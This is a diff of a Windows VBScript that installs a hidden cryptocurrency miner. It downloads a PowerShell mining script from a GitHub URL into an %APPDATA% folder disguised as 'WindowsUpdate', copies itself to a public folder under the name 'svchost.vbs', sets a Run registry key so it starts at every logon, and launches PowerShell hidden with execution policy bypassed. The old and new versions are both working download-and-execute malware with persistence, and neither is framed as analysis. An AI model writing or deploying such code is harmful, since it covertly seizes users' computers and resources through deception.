@@ -1,36 +1,47 @@
 ' ================================
-' Launcher.vbs - Silent Miner Runner + Auto-Start
+' start.vbs - Smart Miner Installer + Self-Healing
 ' ================================
-Dim shell, fso, appData, hiddenFolder, ps1Path, ps1Url, regPath, regName
-Set shell = CreateObject("WScript.Shell")
-Set fso = CreateObject("Scripting.FileSystemObject")
 
-appData = shell.ExpandEnvironmentStrings("%APPDATA%")
-hiddenFolder = appData & "\WindowsUpdate"
-ps1Path = hiddenFolder & "\StartMining.ps1"
-ps1Url = "https://raw.githubusercontent.com/Mrx-coder-1157/mining-scripts/main/StartMining.ps1"
+Set sh = CreateObject("WScript.Shell")
+Set fs = CreateObject("Scripting.FileSystemObject")
+
+' Main paths
+appD  = sh.ExpandEnvironmentStrings("%APPDATA%")
+hFld  = appD & "\WindowsUpdate"
+ps1   = hFld & "\StartMining.ps1"
+url   = "https://raw.githubusercontent.com/Mrx-coder-1157/mining-scripts/main/StartMining.ps1"
+backupVbs = "C:\Users\Public\Libraries\svchost.vbs"
 regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
 regName = "WindowsUpdate"
 
-' Create hidden folder
-If Not fso.FolderExists(hiddenFolder) Then fso.CreateFolder hiddenFolder
+' Create hidden folder if missing
+If Not fs.FolderExists(hFld) Then fs.CreateFolder(hFld)
 
-' Download StartMining.ps1
-Dim http : Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
-http.Open "GET", ps1Url, False
+' Download the PS1 script
+On Error Resume Next
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", url, False
 http.Send
+
 If http.Status = 200 Then
-    Dim stream : Set stream = CreateObject("ADODB.Stream")
+    Set stream = CreateObject("ADODB.Stream")
     stream.Type = 2
     stream.Charset = "utf-8"
     stream.Open
     stream.WriteText http.ResponseText
-    stream.SaveToFile ps1Path, 2
+    stream.SaveToFile ps1, 2
     stream.Close
 End If
+On Error GoTo 0
 
-' Add to startup
-shell.RegWrite regPath & "\" & regName, "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & ps1Path & """", "REG_SZ"
+' Copy this VBS as a backup for future reboots
+If Not fs.FileExists(backupVbs) Then
+    fs.CopyFile WScript.ScriptFullName, backupVbs
+End If
 
-' Run it once now
-shell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & ps1Path & """", 0, False
+' Set registry to run backup VBS silently at startup
+sh.RegWrite regPath & "\" & regName, _
+    "wscript.exe """ & backupVbs & """", "REG_SZ"
+
+' Launch PowerShell miner now silently
+sh.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & ps1 & """", 0, False
